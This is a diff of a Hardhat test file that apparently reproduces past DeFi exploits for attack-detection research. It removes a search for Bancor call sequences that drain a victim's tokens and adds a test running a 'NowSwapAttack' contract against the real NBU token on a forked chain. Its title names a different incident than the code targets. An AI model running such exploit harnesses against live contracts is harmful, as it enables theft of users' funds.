@@ -1,90 +1,36 @@
 import { ethers } from 'hardhat'
 import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'
-import { IERC20 } from '../typechain-types'
-import * as bancorFunctions from './functions/bancor_function' // change this to the appropriate file
-import { Contract } from 'ethers'
+import { NowSwapAttack, IERC20 } from '../typechain-types'
 import { expect } from 'chai'
 
-describe('CCA Detects XXX Test', async function () {
-    let alice: SignerWithAddress
-    let bancor: Contract
-    let XBPTokenAddress: string
-    let XBPToken: IERC20
-
-    let victim = '0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E'
+describe('CCA Detects DaoMaker Attack Test', async function () {
+    let owner: SignerWithAddress
+    let ownerAddress: string
+    let nbu: IERC20
+    let AttackContract: NowSwapAttack
 
     beforeEach(async () => {
-        ;[alice] = await ethers.getSigners()
-        bancor = await ethers.getContractAt('ibancor', '0x5f58058C0eC971492166763c8C22632B583F667f')
-
-        XBPTokenAddress = '0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40'
-        XBPToken = await ethers.getContractAt('IERC20', XBPTokenAddress)
+        owner = (await ethers.getSigners())[0]
+        ownerAddress = await owner.getAddress()
+        const Attack = await ethers.getContractFactory('NowSwapAttack')
+        AttackContract = await Attack.deploy()
+        nbu = await ethers.getContractAt('IERC20', '0xEB58343b36C7528F23CAAe63a150240241310049')
     })
 
-    it('should block number equal to 10592516', async function () {
+    it('should block number equal to 13225516', async function () {
         const blockNumber = await ethers.provider.getBlockNumber()
-        expect(blockNumber).to.equal(10_592_516)
+        expect(blockNumber).to.equal(13225516)
     })
 
-    it('should try to find vulnerability through DFS', async function () {
-        const actions = [
-            // List of functions from bancor_function.ts
-            //bancorFunctions.handleRestrictRegistryUpdate,
-            //bancorFunctions.handleRegisterEtherToken,
-            bancorFunctions.handleTransferOwnership,
-            bancorFunctions.handleSafeTransferFrom,
-        ]
+    it('should execute the attack', async function () {
+        const balanceBefore = await nbu.balanceOf(AttackContract.getAddress())
+        console.log('Before exploiting', await nbu.balanceOf(AttackContract.getAddress()))
 
-        const found = await dfs([], 0)
-        if (!found) {
-            console.log('No vulnerability sequence found.')
-        } else {
-            console.log('Vulnerability sequence found.')
-        }
-        async function checkIncident(victimBalanceBefore: bigint, victimBalanceAfter: bigint) {
-            if (victimBalanceAfter < victimBalanceBefore) {
-                console.log("An anomaly occurred: Victim's balance has decreased")
-                return true
-            }
-        }
+        await AttackContract.attack()
 
-        async function dfs(actionSequence: string[] = [], depth: number): Promise<boolean> {
-            if (depth === actions.length) {
-                return false
-            }
+        const balanceAfter = await nbu.balanceOf(AttackContract.getAddress())
+        console.log('After exploiting', await nbu.balanceOf(AttackContract.getAddress()))
 
-            for (let i = depth; i < actions.length; i++) {
-                // Add the current action's name to the sequence BEFORE calling it
-                actionSequence.push(actions[i].name)
-
-                const victimBalanceBefore = await XBPToken.balanceOf(victim)
-
-                // Call the function from the bancor contract with the appropriate arguments
-                let value = await XBPToken.balanceOf(victim)
-                try {
-                    await actions[i](bancor, XBPToken, victim, alice.address, value)
-                } catch (e) {
-                    // Handle or log the error as needed
-                    // console.log(e);
-                }
-
-                // Get the updated balances
-                const victimBalanceAfter = await XBPToken.balanceOf(victim)
-
-                // Check for incident
-                if (await checkIncident(victimBalanceBefore, victimBalanceAfter)) {
-                    console.log(`Triggering action sequence: ${actionSequence.join(' -> ')}`)
-                    return true
-                }
-
-                // Recursively try the next function
-                const result = await dfs(actionSequence, depth + 1)
-                if (result) return true
-
-                // Remove the last action from the sequence if it didn't lead to an incident
-                actionSequence.pop()
-            }
-            return false
-        }
+        expect(balanceAfter).to.be.greaterThan(balanceBefore)
     })
 })
